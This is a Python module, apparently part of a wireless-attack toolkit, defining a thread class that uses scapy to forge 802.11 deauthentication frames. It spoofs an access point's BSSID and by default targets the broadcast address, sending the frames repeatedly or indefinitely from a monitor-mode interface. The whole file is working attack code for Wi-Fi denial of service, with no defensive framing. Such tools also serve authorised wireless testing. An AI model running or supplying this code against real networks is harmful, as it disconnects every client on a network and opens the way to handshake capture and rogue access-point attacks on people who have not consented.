from typing import Any
import time
from threading import Thread
from scapy.all import sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from .utils import MonitorMode


class Deauthentication(Thread):

    def __init__(self, iface: str, channel: int, bssid_mac: str,
                 target_mac: str = "ff:ff:ff:ff:ff:ff", count: int = 1, delay: float = 1.0) -> None:
        super().__init__()
        self._iface: str = iface
        self._bssid_mac: str = bssid_mac
        self._target_mac: str = target_mac
        self._count: int = count
        self._delay: float = delay
        self._monitor: MonitorMode = MonitorMode(
            iface=self._iface,
            hopping_channel=False
        )
        self._monitor.set_channel(channel=channel)
        self._running: bool = True
        self.start()

    def stop(self) -> None:
        self._monitor.stop()
        self._running = False

    def run(self) -> None:
        while self._running:
            self._send_deauth()
            time.sleep(self._delay)
            if self._count == 0:
                continue
            self._count -= 1
            if self._count == 0:
                self.stop()
                break

    def _send_deauth(self) -> None:
        # addr1 = DA
        # addr2 = SA
        # addr3 = BSSID
        packet: Any = RadioTap()/Dot11(
            addr1=self._target_mac,
            addr2=self._bssid_mac,
            addr3=self._bssid_mac
        )/Dot11Deauth(
            reason=7
        )
        sendp(
            x=packet,
            iface=self._iface
        )
